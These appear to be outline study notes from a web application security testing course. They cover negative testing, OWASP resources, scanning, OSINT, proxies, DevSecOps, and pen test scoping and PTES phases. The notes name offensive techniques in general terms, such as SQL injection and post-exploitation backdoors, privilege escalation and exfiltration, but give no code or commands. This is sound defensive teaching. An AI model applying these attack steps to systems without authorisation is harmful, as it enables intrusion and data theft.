&nbsp;	• Key Concepts

&nbsp;		○ Definition of Negative Testing

&nbsp;			§ Sending unexpected, invalid, or malicious input to see how the app reacts.

&nbsp;			§ Goal: Ensure the app doesn’t do anything it’s not supposed to do.

&nbsp;			§ Example: Using escape characters to test for SQL injection attempts (e.g., extracting usernames or dropping tables).

&nbsp;		○ Difference from Positive Testing

&nbsp;			§ Positive testing is finite and straightforward, derived from functional requirements (what the app should do).

&nbsp;			§ Negative testing is broader and harder to scope, since attackers have nearly infinite input combinations and strategies (what the app shouldn’t do).

&nbsp;		○ Approaches to Negative Testing

&nbsp;			§ Start with misuse cases: scenarios where the app could be abused.

&nbsp;			§ Derive tests from:

&nbsp;				□ Security standards (internal \& external).

&nbsp;				□ OWASP Top 10: Each category represents a class of common attacks (e.g., injection, broken authentication, insecure deserialization).

&nbsp;				□ OWASP Cheat Sheet Series: 78+ guides with defensive coding practices developers should follow (from AJAX to XML).

&nbsp;		○ Test Case Examples

&nbsp;			§ SQL Injection: Attempting to extract data from a known table.

&nbsp;			§ Authorization bypass: Checking if restricted data can be accessed without proper permissions.

&nbsp;			§ Session handling abuse: Seeing if sessions persist when they shouldn’t.

&nbsp;		○ Automation \& Integration

&nbsp;			§ Automating negative test cases (especially for OWASP Top 10 vulnerabilities) helps catch issues continuously.

&nbsp;			§ QA processes become more robust when negative testing is part of standard practice.

&nbsp;		○ Developer Collaboration

&nbsp;			§ Negative testing not only strengthens security but also reinforces developer awareness of secure coding practices.

&nbsp;			§ Validating that defensive coding principles (from cheat sheets) are actually applied.

&nbsp;			§ When an app passes these tests, it’s both a technical and cultural win for the dev team.



SQA Metrics

&nbsp;	• Software Quality Assurance (SQA) metrics are essential for measuring, tracking, and improving both security and the testing process itself over time. They help identify strengths, weaknesses, gaps, and trends in software security, ultimately leading to more secure and reliable applications.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of SQA Metrics

&nbsp;			§ Measure how well the app performs under security testing—both now and in the future.

&nbsp;			§ Identify strengths, weaknesses, and gaps in testing processes.

&nbsp;			§ Improve efficiency by eliminating redundant tests and finding missing ones.

&nbsp;			§ Support continuous improvement in both software security and QA methods.

&nbsp;		○ Security Foundations

&nbsp;			§ CIA Triad (Confidentiality, Integrity, Availability):

&nbsp;				□ Confidentiality: Keeping secrets secret.

&nbsp;				□ Integrity: Preventing unauthorized changes.

&nbsp;				□ Availability: Ensuring systems stay online and accessible.

&nbsp;				□ Priority differs by organization (e.g., integrity critical for nuclear plant systems, availability critical for e-commerce).

&nbsp;			§ ISO/IEC 25010 Standard:

&nbsp;				□ Provides a comprehensive quality model for software.

&nbsp;				□ Since 2011, security became its own characteristic, broken into five sub-characteristics:

&nbsp;					® Confidentiality

&nbsp;					® Integrity

&nbsp;					® Non-repudiation (prove events occurred)

&nbsp;					® Accountability (assign actions to an owner)

&nbsp;					® Authenticity (prove identity of person/resource)

&nbsp;		○ Guidance Sources

&nbsp;			§ OWASP Developer Guide Project: Focuses on confidentiality and integrity; offers best practices for SQA metrics and processes.

&nbsp;			§ OWASP Application Security Metrics:

&nbsp;				□ Direct metrics: Within the software (e.g., lines of code, languages, security mechanisms, configs).

&nbsp;				□ Indirect metrics: Outside the software (e.g., documentation completeness, developer training, reporting processes).

&nbsp;		○ Core Metrics to Track

&nbsp;			§ Security bugs detected vs. security bugs remediated:

&nbsp;				□ Critical to monitor in every development environment.

&nbsp;				□ Helps security teams apply compensating controls and track whether the gap is shrinking or widening.

&nbsp;		○ Additional Resources

&nbsp;			§ NIST SAMATE (Software Assurance Metrics and Tool Evaluation):

&nbsp;				□ Provides frameworks, datasets, and test suites for measuring software vulnerabilities.

&nbsp;				□ Bugs Framework: Categorizes vulnerabilities (auth/authz issues, randomness flaws, etc.) and ties into MITRE CWE.

&nbsp;				□ Juliet Test Suites \& Software Assurance Reference Dataset: Thousands of test programs to help build test cases.

&nbsp;				□ Though not updated frequently, still highly valuable.

&nbsp;		



OWASP Testing Guide

&nbsp;	• The OWASP Web Security Testing Guide is a flagship OWASP project that serves as a comprehensive framework for structuring, conducting, and integrating security tests into QA, source code reviews, and penetration testing. It provides a structured, repeatable approach that saves time, ensures coverage, and ties test results back to business objectives.

&nbsp;	• Key Concepts

&nbsp;		○ Value of the OWASP Testing Guide

&nbsp;			§ Considered a cornerstone resource for web application security testing

&nbsp;			§ Provides ~80% of what a penetration tester or QA engineer needs to conduct thorough tests.

&nbsp;			§ The same tests used in penetration testing can (and should) be integrated into QA workflows.

&nbsp;		○ OWASP Project Categories

&nbsp;			§ Flagship projects: Mature, strategic, widely adopted (e.g., Testing Guide).

&nbsp;			§ Production projects: Production-ready but still growing.

&nbsp;			§ Other projects: Tools, documentation, or early-stage projects (lab, incubator, playground).

&nbsp;			§ The Testing Guide is flagship status, emphasizing its credibility and maturity.

&nbsp;		○ Key Sections of the Testing Guide

&nbsp;			§ Section 2.9 – Security Test Requirements

&nbsp;				□ Identify testing objectives first.

&nbsp;				□ Align activities with threat and countermeasure taxonomies.

&nbsp;				□ Differentiate between functional vs. risk-driven security requirements.

&nbsp;				□ Build use and misuse cases.

&nbsp;			§ Section 2.10 – Integration into Workflows

&nbsp;				□ Clarifies what developers should handle (unit tests) vs. what testing engineers should own (integration, functional, operational tests).

&nbsp;				□ Helps embed security testing naturally into the SDLC.

&nbsp;			§ Section 2.11 – Making Sense of Results

&nbsp;				□ Transform test outcomes into metrics and measurements.

&nbsp;				□ Track progress over time.

&nbsp;				□ Ensure results are linked back to business use cases to prove organizational value.

&nbsp;		○ Practical Use in QA

&nbsp;			§ The full 200+ page guide is detailed but not efficient for real-time use.

&nbsp;			§ Best practice: distill it into a testing checklist or spreadsheet with:

&nbsp;				□ Test name

&nbsp;				□ Test description

&nbsp;				□ Tools/techniques

&nbsp;				□ Results tracking

&nbsp;			§ Community has built enhanced tools (e.g., GitHub spreadsheet with risk assessment calculators and summary findings tabs).

&nbsp;		○ Automation \& Continuous Testing

&nbsp;			§ Start with manual tracking and use checklists as a requirements stock.

&nbsp;			§ Gradually automate tests to scale coverage and efficiency.





#### Assessing Deployed Apps



Manual vs Automated Testing

&nbsp;	• Effective application security testing requires a balance of manual and automated testing, informed by static analysis and aligned with organizational security maturity models. Automated tools provide speed and coverage, while manual testing delivers context, deeper insight, and business logic validation. Together, they provide a more complete security picture.

&nbsp;	• Key Concepts

&nbsp;		○ Balancing Manual and Automated Testing

&nbsp;			§ Automated scans are fast, repeatable, and can reveal many flaws quickly.

&nbsp;			§ Manual testing validates findings, eliminates false positives, and identifies complex vulnerabilities (e.g., business logic flaws, chained exploits).

&nbsp;			§ The best results come from combining both.

&nbsp;		○ Foundation in Static Testing

&nbsp;			§ Before running dynamic tests, review:

&nbsp;				□ Application documentation

&nbsp;				□ Security requirements

&nbsp;				□ Source code security reviews

&nbsp;				□ Results of static tests (e.g., against OWASP Top 10)

&nbsp;			§ This preparation helps focus dynamic tests on known risks and fine-tune tools to avoid breaking apps during scans.

&nbsp;		○ Dynamic Testing Tools

&nbsp;			§ OWASP ZAP: Automates discovery of flaws, allows tuning (exclude sensitive URLs, force-browse hidden paths).

&nbsp;			§ SQLMAP: Useful if static reviews reveal weaknesses in SQL injection defenses.

&nbsp;			§ Automated scans often include remediation advice, saving time.

&nbsp;		○ Manual Testing Strengths

&nbsp;			§ Validate automated findings (weed out false positives).

&nbsp;			§ Explore business logic flaws missed by scanners.

&nbsp;			§ Combine lower-severity issues into real-world attack chains.

&nbsp;			§ Provide attacker-like creativity that tools can’t replicate.

&nbsp;		○ No “Perfect Model”

&nbsp;			§ George Box’s quote: “All models are wrong, some are useful.”

&nbsp;			§ There’s no universal formula for the right balance between static/dynamic, manual/automated testing.

&nbsp;			§ The right approach depends on organizational security maturity and available resources.

&nbsp;		○ Maturity Models for Guidance

&nbsp;			§ OWASP SAMM (Software Assurance Maturity Model):

&nbsp;				□ Ties security practices to business functions (governance, design, implementation, verification, operations).

&nbsp;				□ Verification phase gives guidance on security testing.

&nbsp;			§ BSIMM (Building Security In Maturity Model):

&nbsp;				□ Domains: governance, intelligence, SDLC touchpoints, deployment.

&nbsp;				□ Security testing lives in the SDLC touchpoints domain.

&nbsp;			§ Mapping: OWASP maintains a SAMM ↔ BSIMM mapping for blended use.

&nbsp;		○ Iterative Improvement

&nbsp;			§ Any testing is better than none.

&nbsp;			§ Start small → prototype → iterate → improve.

&nbsp;			§ Discard what doesn’t work, keep refining the balance

&nbsp;			§ Goal: Over time, find the right mix of automation and manual effort to secure applications effectively.



Scanning vs Pen Testing

&nbsp;	• Automated scanning is not the same as penetration testing. Scans collect information and identify potential weaknesses, while penetration testing uses human creativity and strategy to exploit those weaknesses, uncover business logic flaws, and simulate real-world attacks. Both are important, but they serve different roles in a security testing strategy.

&nbsp;	• Key Concepts

&nbsp;		○ Scanning

&nbsp;			§ Definition: Automated collection of information and detection of potential vulnerabilities.

&nbsp;			§ Scope: Should include applications, host systems, backend databases, and network appliances.

&nbsp;			§ Techniques:

&nbsp;				□ Signature-based scanning: Detects known issues (e.g., missing patches, version numbers).

&nbsp;				□ Heuristic scanning (trial and error): Simulates input to discover how the app responds.

&nbsp;				□ Fuzzing: Sending malformed/semi-malformed data, special characters, large/negative numbers to elicit responses that could reveal flaws.

&nbsp;			§ Purpose: Prioritizes findings by risk but does not try to break the system.

&nbsp;			§ Tools:

&nbsp;				□ Nmap – open ports, admin services (not a vulnerability scanner).

&nbsp;				□ Nessus, Nexpose, Qualys – vulnerability scanners for hosts and infrastructure.

&nbsp;				□ OWASP ZAP, Wfuzz, Burp Suite Intruder – web app scanning and fuzzing tools.

&nbsp;				□ OWASP maintains curated lists of scanning tools (Appendix A of Testing Guide, community lists).

&nbsp;		○ Penetration Testing

&nbsp;			§ Definition: A human-driven process that attempts to exploit vulnerabilities to achieve specific goals.

&nbsp;			§ Key Differences from Scanning:

&nbsp;				□ Goes beyond detection—tests exploitation.

&nbsp;				□ Uses creativity and unconventional thinking.

&nbsp;				□ Targets business logic flaws and full application workflows that automated tools can’t handle.

&nbsp;				□ Can combine results from scanners with manual techniques.

&nbsp;			§ Goals:

&nbsp;				□ Access restricted data.

&nbsp;				□ Escalate privileges (e.g., compromise an admin account).

&nbsp;				□ Test resilience of app logic.

&nbsp;			§ Human Element: Pen testing leverages creativity; AI may assist in future, but humans remain essential.

&nbsp;		○ Relationship Between Scanning and Pen Testing

&nbsp;			§ Scans come first: Gather baseline information and identify likely weak points.

&nbsp;			§ Pen tests build on scan results: Validate and exploit vulnerabilities to measure real-world impact.

&nbsp;			§ Together, they provide a comprehensive security assessment.

&nbsp;		○ Community and Resources

&nbsp;			§ OWASP Web Security Testing Guide Appendix A: Specialized scanning tools list.

&nbsp;			§ OWASP Phoenix chapter project: Community-curated list of security testing tools.

&nbsp;			§ Burp Suite (PortSwigger): Popular toolset for both QA and penetration testing (advanced features require paid version).



Testing in Production

&nbsp;	• Security testing should be performed in a non-production environment whenever possible. This allows for unrestricted, aggressive testing without risk to live systems, helping uncover vulnerabilities before attackers exploit them in production. However, testing in non-prod requires coordination, backups, and awareness of differences between environments.

&nbsp;	• Key Concepts

&nbsp;		○ Why Test in Non-Production

&nbsp;			§ Non-production = “gloves off” testing: run any test, even destructive ones.

&nbsp;			§ Prevents slowdowns, outages, or data corruption in production.

&nbsp;			§ Let's you identify bugs and vulnerabilities before the app reaches end users.

&nbsp;			§ Criminals will run destructive tests against production—so defenders should test them safely in non-prod first.

&nbsp;		○ Change Control and Organizational Support

&nbsp;			§ Testing in non-prod ties into change control policies:

&nbsp;				□ Validate changes in non-prod before production deployment.

&nbsp;				□ Reduces risk of unplanned outages or business disruption.

&nbsp;			§ Including security testing in change control helps gain management buy-in for strong testing practices.

&nbsp;		○ Scope of Testing

&nbsp;			§ All tests are in scope in non-production (SQL injection, denial of service, data corruption, etc.).

&nbsp;			§ Be as thorough and adversarial as possible—if you skip a test, an attacker won’t.

&nbsp;			§ Identify vulnerabilities that will carry over to production unless addressed.

&nbsp;		○ Caveats and Best Practices

&nbsp;			§ Respect shared environments: Coordinate with other testers to avoid blocking their work.

&nbsp;			§ Backups are essential: Be ready to restore quickly if destructive tests damage the environment.

&nbsp;			§ Environment differences: Code base should match production, but infrastructure may differ—note which vulnerabilities would migrate to production.

&nbsp;		○ If Non-Prod Isn’t Available

&nbsp;			§ At minimum, use a local copy on a developer’s/tester’s machine.

&nbsp;			§ Skipping non-prod testing to save time or money is a false economy—short-term savings lead to long-term costs when attackers find the flaws.



Testing in Production

&nbsp;	• While most security testing should occur in non-production, testing in production environments is also valuable because it reveals vulnerabilities and conditions attackers could actually exploit. However, testing in production requires extreme caution, careful planning, and strict communication to avoid unintended disruption or legal/operational issues.

&nbsp;	• Key Concepts

&nbsp;		○ Why Test in Production

&nbsp;			§ Real-world accuracy: Production and non-production rarely match perfectly (different patch levels, configs, devices). Testing in prod eliminates inaccuracies from environment differences.

&nbsp;			§ Risk validation: A vulnerability critical in non-prod may be mitigated in prod by defenses (e.g., WAF blocking injection attempts).

&nbsp;			§ Publicly exposed data: Only production has real-world DNS records, IP addresses, and TLS certificates—attackers will use this, so defenders must test it too.

&nbsp;		○ Cautions \& Limitations

&nbsp;			§ No authenticated scans in prod: They risk unauthorized data changes or corruption (serious legal/operational consequences).

&nbsp;			§ Less intrusive settings: Tools should be configured to minimize impact—testing here = “kiddie gloves.”

&nbsp;			§ No untested tools in prod: Always vet tools first in non-prod.

&nbsp;		○ Planning \& Communication

&nbsp;			§ Communication is critical and should be overdone rather than underdone:

&nbsp;				□ Notify stakeholders a week before, the day before, the day of, and at the start/end of testing.

&nbsp;			§ First production test should run under change control procedures, ideally in an approved overnight maintenance window.

&nbsp;			§ A clear communication plan and change advisory board involvement ensures coordination and mitigates fallout if problems occur.

&nbsp;		○ Tools \& Methods

&nbsp;			§ Use the same tools as in non-prod, but with adjusted, less aggressive settings.

&nbsp;			§ Testing scope in production should focus on verifying known risks, public exposure, and defenses, not full destructive testing.

&nbsp;		○ Balance with Non-Prod Testing

&nbsp;			§ Non-prod = “gloves off,” break things to learn.

&nbsp;			§ Prod = “kiddie gloves,” cautious validation of real-world risks.

&nbsp;			§ Both are necessary: non-prod to discover flaws, prod to confirm real-world exposure and defenses.



OSINT Gathering

&nbsp;	• Open Source Intelligence (OSINT) gathering uses publicly available information to learn about applications, infrastructure, and organizations. Attackers leverage OSINT for stealthy reconnaissance without alerting defenders, so security teams should also perform OSINT gathering to understand and reduce their exposure.

&nbsp;	• Key Concepts

&nbsp;		○ What is OSINT

&nbsp;			§ Stands for Open Source Intelligence, originating from military and government use.

&nbsp;			§ In web application security, OSINT means collecting publicly available data attackers could use.

&nbsp;			§ Advantage: stealth — attackers don’t need to scan your system directly, reducing detection risk.

&nbsp;		○ Differences: Non-Prod vs. Prod

&nbsp;			§ Non-Production: Usually internal, with little/no OSINT exposure.

&nbsp;			§ Production: Public-facing systems must expose information (DNS entries, IP addresses, TLS certificates, login forms, password resets, etc.).

&nbsp;		○ Why OSINT Matters

&nbsp;			§ Attackers can skip noisy scans and move directly from recon to exploitation.

&nbsp;			§ Defenders lose the chance to stop attacks early and must react once the exploit starts.

&nbsp;			§ Security teams should perform OSINT on their own systems to see what attackers see.

&nbsp;		○ Examples of OSINT Data \& Tools

&nbsp;			§ TLS/SSL Certificates: Reveal key strength, algorithms, and configuration.

&nbsp;				□ Tools: SSL Labs (Qualys), Mozilla Observatory.

&nbsp;			§ DNS \& Subdomains: Identify hosts and linked services.

&nbsp;				□ Tools: DNSdumpster, PentestTools Subdomain Finder.

&nbsp;			§ Existing Search Engines: Already catalog OSINT data.

&nbsp;				□ Tools: Shodan (banners, OS, open ports), Censys (certificate search, admin portals).

&nbsp;			§ Cross-Verification: OSINT can be outdated or incomplete—use multiple sources to validate.

&nbsp;		○ Automation of OSINT

&nbsp;			§ Automating OSINT gathering improves efficiency, just like QA test automation.

&nbsp;			§ Tools/Resources:

&nbsp;				□ Trace Labs OSINT Virtual Machine (preloaded with tools).

&nbsp;				□ Maltego (visual link analysis).

&nbsp;				□ Recon-ng (framework for reconnaissance).

&nbsp;			§ Inspired by the older Buscador VM project.

&nbsp;		○ Defensive Benefits

&nbsp;			§ By performing OSINT internally, organizations:

&nbsp;				□ Understand what attackers already know.

&nbsp;				□ Identify overexposed information.

&nbsp;				□ Improve defenses (e.g., tightening TLS, removing exposed admin portals).

&nbsp;			§ Embedding OSINT into dynamic application security testing (DAST) provides a more complete security view.



Web App Proxies

&nbsp;	• Web application proxies are critical tools for security testing because they intercept and allow manipulation of traffic between a client and a web application. They enable testers to inspect, modify, and analyze requests and responses—helping to identify weaknesses that attackers could exploit.

&nbsp;	• Key Concepts

&nbsp;		○ What is a Web Application Proxy

&nbsp;			§ A software component that sits between the client and the server.

&nbsp;			§ Captures all requests and responses for inspection and manipulation.

&nbsp;			§ Essential in every web application security assessment.

&nbsp;		○ Relation to Attacks

&nbsp;			§ Similar to a man-in-the-middle (MITM) attack technique:

&nbsp;				□ Attackers may use proxies to spy on sensitive data (passwords, tokens).

&nbsp;				□ Can manipulate traffic (redirect, alter requests) before reaching the server.

&nbsp;			§ Testers use proxies ethically to validate that apps cannot be compromised in this way.

&nbsp;		○ Defenses Against Proxy-based Attacks

&nbsp;			§ Encrypt data in transit with SSL/TLS certificates.

&nbsp;			§ Enforce HTTP Strict Transport Security (HSTS):

&nbsp;				□ Forces HTTPS only.

&nbsp;				□ Forces HTTPS only.

&nbsp;		○ Types of Proxies

&nbsp;			§ Web Proxies: Handle HTTP/HTTPS only.

&nbsp;				□ Browser-based plugins (e.g., Tamper Dev for Chrome, Tamper Data for Firefox Quantum).

&nbsp;				□ Good for most web testing.

&nbsp;			§ TCP Proxies: Handle all TCP traffic, including non-web protocols.

&nbsp;				□ Needed for broader protocol testing.

&nbsp;		○ Popular Proxy Tools

&nbsp;			§ Burp Suite (Enterprise, Professional, Community):

&nbsp;				□ Includes Burp Proxy, the core feature other modules rely on.

&nbsp;			§ OWASP ZAP: Open-source alternative, widely used.

&nbsp;			§ Fiddler: Longstanding proxy tool, useful for HTTP/S traffic.

&nbsp;			§ Browser extensions: Tamper Dev, Tamper Data (for request/response inspection \& manipulation).

&nbsp;		○ Best Practices for Security Testing with Proxies

&nbsp;			§ Use proxies to inspect and manipulate traffic to simulate potential attacks.

&nbsp;			§ Integrate proxies into dynamic application security testing (DAST) workflows.

&nbsp;			§ Experiment with different tools, then adopt the one(s) best suited for your testing needs.



DevSecOps

&nbsp;	• DevSecOps integrates security into the fast-paced DevOps model, ensuring security is embedded into CI/CD pipelines without disrupting development. Security must evolve alongside development and operations, using automation, collaboration, and OWASP guidance to reduce business risk while keeping up with rapid release cycles.

&nbsp;	• Key Concepts

&nbsp;		○ Shift in Development Models

&nbsp;			§ Traditional: monolithic software with updates a few times a year.

&nbsp;			§ Modern: agile/DevOps with updates multiple times per week.

&nbsp;			§ Ops and security had to adapt to faster release cycles.

&nbsp;		○ DevOps vs. DevSecOps

&nbsp;			§ DevOps: Dev + Ops share tools and practices to improve speed and efficiency.

&nbsp;			§ DevSecOps: Security is embedded, not siloed.

&nbsp;				□ Blends business acumen + technical security knowledge.

&nbsp;				□ Goal: risk reduction to minimize business disruptions.

&nbsp;			§ Without security in the pipeline, incident risk rises significantly.

&nbsp;		○ CI/CD Pipeline

&nbsp;			§ Core of DevOps, often represented by an infinity loop (continuous flow, no start or end).

&nbsp;			§ CI = Continuous Integration, CD = Continuous Delivery/Deployment.

&nbsp;			§ Non-linear, always moving—security must integrate seamlessly.

&nbsp;		○ Challenge for Security Professionals

&nbsp;			§ Security often wasn’t included when DevOps pipelines were first built.

&nbsp;			§ Task: find ways to integrate security without disrupting workflow.

&nbsp;			§ Forcing intrusive security measures can lead to resistance and failure.

&nbsp;		○ OWASP DevSecOps Guidelines

&nbsp;			§ Security practices/tools to insert into pipelines:

&nbsp;				□ Secret scanning – detect hardcoded credentials.

&nbsp;				□ Software Composition Analysis (SCA) – find vulnerabilities in third-party libraries.

&nbsp;				□ Static Application Security Testing (SAST) – analyze source code.

&nbsp;				□ Infrastructure-as-Code (IaC) scanning – check cloud deployments.

&nbsp;				□ Container scanning – test containerized apps for weaknesses.

&nbsp;				□ Dynamic Application Security Testing (DAST) – analyze running apps (this course’s focus).

&nbsp;				□ Infrastructure scanning – test supporting systems/components.

&nbsp;				□ Compliance checks – ensure alignment with internal/external requirements.

&nbsp;		○ Cloud-Native Pipelines

&nbsp;			§ CI/CD pipeline tools from major cloud providers:

&nbsp;				□ AWS CodePipeline

&nbsp;				□ Azure Pipelines

&nbsp;				□ Google Cloud Build

&nbsp;			§ Security should integrate into these native pipelines.

&nbsp;		○ Best Practices for Implementation

&nbsp;			§ Embrace DevSecOps as a mindset, not just a toolset.

&nbsp;			§ Educate dev/ops teams on where and how security fits.

&nbsp;			§ Meet teams where they are: integrate into their workflows rather than disrupting them.

&nbsp;			§ Look for opportunities to automate security testing within existing pipelines.





#### Web App Pen Testing



Scoping a Web App Pen Test

&nbsp;	• Scoping a web application penetration test is critical to ensure that testing is goal-driven, clearly defined, and aligned with business, technical, and legal constraints. Proper scoping prevents wasted effort, reduces risk of disruption, and ensures compliance with hosting providers’ rules of engagement.

&nbsp;	• Key Concepts

&nbsp;		○ Define the Goal

&nbsp;			§ The end goal drives the scope:

&nbsp;				□ Data-centric: Access restricted/sensitive data (e.g., PCI DSS, HIPAA requirements).

&nbsp;				□ Account-centric: Gain access to another user’s or admin’s account and test potential damage.

&nbsp;			§ Clarifying the test’s objective ensures focus on the right assets.

&nbsp;		○ Define What’s In and Out of Scope

&nbsp;			§ URLs / Applications: Confirm exact apps, subdomains, or subdirectories in-scope.

&nbsp;			§ Exclusions: Identify pages that should not be tested (e.g., admin or password reset).

&nbsp;			§ IP addresses / Net blocks: Apps may be accessible directly via IP addresses (sometimes forgotten or decommissioned systems).

&nbsp;			§ User accounts: Determine if valid test accounts will be provided and whether certain user/admin accounts are off-limits.

&nbsp;		○ Timing Considerations

&nbsp;			§ Testing can impact availability or performance. Minimize risk by:

&nbsp;				□ Avoiding peak business times (e.g., e-commerce during holidays).

&nbsp;				□ Respecting industry-specific blackout periods (e.g., code freezes).

&nbsp;				□ Testing during maintenance/change windows where possible.

&nbsp;			§ Coordinate with ops and security teams to avoid false alarms from alerts.

&nbsp;		○ Non-Production Testing

&nbsp;			§ Use non-production environments for high-risk exploits.

&nbsp;			§ Proving an exploit in non-prod + reviewing change controls may be enough to validate production exposure, reducing business risk.

&nbsp;		○ Documentation

&nbsp;			§ Never assume. Get scoping details in writing to avoid misunderstandings.

&nbsp;			§ Clearly define: in-scope systems, exclusions, accounts, time frames, and change-control approvals.

&nbsp;		○ Cloud Hosting Provider Requirements

&nbsp;			§ Each provider has its own penetration testing rules:

&nbsp;				□ AWS: Explicit policies outlining what’s allowed.

&nbsp;				□ Azure: No prior notification needed, but must comply with unified rules of engagement.

&nbsp;				□ Google Cloud: No notification needed, but must follow acceptable use policy \& ToS.

&nbsp;			§ Other providers: always check before testing.



Avoiding Production Impacts

&nbsp;	• Penetration testing in production must be carefully managed to avoid disrupting live systems. Poorly scoped or miscommunicated tests can cause serious operational, legal, and reputational issues. By properly engaging stakeholders, documenting scope, and testing in non-production first, testers can minimize risks while still achieving valuable security insights.

&nbsp;	• Key Concepts

&nbsp;		○ Risks of Testing in Production

&nbsp;			§ Pen tests can accidentally cause:

&nbsp;				□ Slowdowns or outages.

&nbsp;				□ Corrupted databases.

&nbsp;				□ Business-critical failures.

&nbsp;			§ Mistakes can create organizational fallout (e.g., legal, HR, diversity issues in the shared story).

&nbsp;			§ Over-testing = higher risk but more comprehensive results.

&nbsp;			§ Under-testing = less risk but leaves blind spots, creating a false sense of security.

&nbsp;		○ Scoping Trade-Offs

&nbsp;			§ Inclusive scope → thorough test, more findings, but higher chance of breaking production.

&nbsp;			§ Restricted scope → safer and faster, but may miss real risks.

&nbsp;			§ Pen test scoping is always a balancing act.

&nbsp;		○ Five-Step Process to Reduce Production Impacts

&nbsp;			§ Communicate with stakeholders

&nbsp;				□ Meet with all stakeholders (IT, HR, legal, business leaders).

&nbsp;				□ Be transparent about tools, methods, risks, and benefits.

&nbsp;			§ Document risks and conversations

&nbsp;				□ Capture agreements and concerns in the project plan or statement of work.

&nbsp;				□ Clarify the link between scope restrictions and the accuracy of findings.

&nbsp;			§ Call out exclusions explicitly

&nbsp;				□ If forms, accounts, or endpoints are excluded, note they won’t be tested.

&nbsp;				□ Highlight that excluded elements may still represent common attack vectors (e.g., SQL injection).

&nbsp;			§ Review and approve the plan

&nbsp;				□ Go over documentation with stakeholders before starting.

&nbsp;				□ Get explicit approval of what is and isn’t in scope.

&nbsp;			§ Test first in non-production

&nbsp;				□ Run tools against non-prod to gauge impact.

&nbsp;				□ Adjust settings or methods before applying to production.

&nbsp;		○ Lessons Learned

&nbsp;			§ Miscommunication can cause major reputational damage, even if no real harm was intended.

&nbsp;			§ Over-communicate, document everything, and gain approval before testing.

&nbsp;			§ Experience and preparation separate reckless testing from professional security assessments.



Penetration Testing Execution

&nbsp;	• The Penetration Testing Execution Standard (PTES) provides a structured, seven-phase framework for conducting penetration tests—from scoping to reporting. By following PTES, testers leverage best practices developed by industry experts, ensuring tests are thorough, realistic, and aligned with business needs.

&nbsp;	• Key Concepts

&nbsp;		○ PTES as a Framework

&nbsp;			§ Provides expert guidance covering the full penetration testing lifecycle.

&nbsp;			§ Organized into seven phases, visualized as a funnel: broad early activities (info gathering) → narrower, focused later stages (exploitation, reporting).

&nbsp;			§ Helps testers avoid wasted effort and deliver comprehensive, business-relevant results.

&nbsp;		○ Seven Phases of PTES

&nbsp;			§ Pre-Engagement Interactions

&nbsp;				□ Define scope (in-scope vs. out-of-scope systems, URLs, accounts).

&nbsp;				□ Establish rules of engagement: timelines, procedures if detected/blocked.

&nbsp;				□ Communicate with third parties (MSSPs, hosting providers).

&nbsp;				□ Update communication plan (contacts, notification process).

&nbsp;			§ Intelligence Gathering

&nbsp;				□ Collect as much information as possible about the target app/infrastructure.

&nbsp;				□ Balance active (direct scanning) vs. passive (stealthy OSINT) methods.

&nbsp;				□ Use OSINT \& foot printing (DNS, TLS certs, Shodan, etc.).

&nbsp;				□ PTES defines three levels of information gathering to avoid “rabbit holes.”

&nbsp;			§ Threat Modeling

&nbsp;				□ Identify real-world threat actors and emulate their methods.

&nbsp;				□ Analyze business assets \& processes tied to the app.

&nbsp;				□ Incorporate models like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) or DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

&nbsp;			§ Vulnerability Analysis

&nbsp;				□ Use vulnerability scanners (e.g., Burp Suite, OWASP ZAP).

&nbsp;				□ Include APIs \& web services in testing (not just user-facing apps).

&nbsp;				□ Perform both active scans and research (e.g., CVE databases).

&nbsp;				□ Identify and prioritize exploitable weaknesses.

&nbsp;			§ Exploitation

&nbsp;				□ Attempt to exploit identified vulnerabilities.

&nbsp;				□ Plan for countermeasures (e.g., WAF, SOC detection).

&nbsp;				□ Distinguish false positives from real exploitable issues.

&nbsp;				□ Goal: prove the actual risk by compromising the application.

&nbsp;			§ Post-Exploitation

&nbsp;				□ Four key activities:

&nbsp;					® Persistence (maintain access, e.g., backdoors).

&nbsp;					® Privilege Escalation \& Lateral Movement (expand control).

&nbsp;					® Data Exfiltration (extract sensitive/restricted data).

&nbsp;					® Cleanup (remove artifacts/backdoors).

&nbsp;				□ Simulates what real attackers would do after the initial exploit.

&nbsp;			§ Reporting

&nbsp;				□ Most important phase: translate technical results into actionable findings.

&nbsp;				□ Executive Summary: non-technical, focused on business impact.

&nbsp;				□ Technical Details: tools used, techniques, step-by-step explanations.

&nbsp;				□ Goal: readers should be able to replicate tests and trust remediation recommendations.



Types of Pen Tests

&nbsp;	• There are three main types of penetration tests—black box, gray box, and white box—and each offers different perspectives and trade-offs. Organizations should aim to use all three over time to gain a complete picture of their application’s security posture, influenced by factors like time, resources, and testing goals.

&nbsp;	• Key Concepts

&nbsp;		○ Black Box Testing

&nbsp;			§ Tester = outsider with no prior knowledge of the application or controls.

&nbsp;			§ Simulates a real-world attacker’s perspective.

&nbsp;			§ Strength: most realistic external view.

&nbsp;			§ Weakness: may overlook vulnerabilities because the tester doesn’t have insider context.

&nbsp;		○ White Box Testing

&nbsp;			§ Tester is given full internal knowledge: reports, diagrams, scan results, valid credentials.

&nbsp;			§ Goal: maximize tester’s time by focusing directly on the most relevant controls.

&nbsp;			§ Strength: highly thorough, efficient at uncovering flaws.

&nbsp;			§ Weakness: less realistic in simulating a true external attacker’s view.

&nbsp;		○ Gray Box Testing

&nbsp;			§ Middle ground: tester is given some insider knowledge, but not everything.

&nbsp;			§ Balances outsider realism with insider efficiency.

&nbsp;			§ Most common approach in practice.

&nbsp;			§ The amount of info is usually negotiated during pre-engagement.

&nbsp;		○ Factors Influencing Test Type

&nbsp;			§ Time \& Cost: Pen tests range from days to weeks; budget and time constraints shape scope.

&nbsp;			§ Tester Role: Internal red teams can spend more time and conduct repeated tests; external consultants may be time-limited.

&nbsp;			§ Goal of the Test:

&nbsp;				□ Compliance-driven orgs may settle for black/gray box.

&nbsp;				□ Security-mature orgs often combine all three for ongoing assurance.

&nbsp;		○ Recommended Approach

&nbsp;			§ Do all three types at least once to get a well-rounded view.

&nbsp;				□ Start with black box → attacker’s perspective.

&nbsp;				□ Move to gray box → partial insider view.

&nbsp;				□ Establish recurring white box tests → ongoing validation with full knowledge.

&nbsp;			§ Use findings from previous tests to inform scoping and pre-engagement for the next round.



Web Application Firewalls

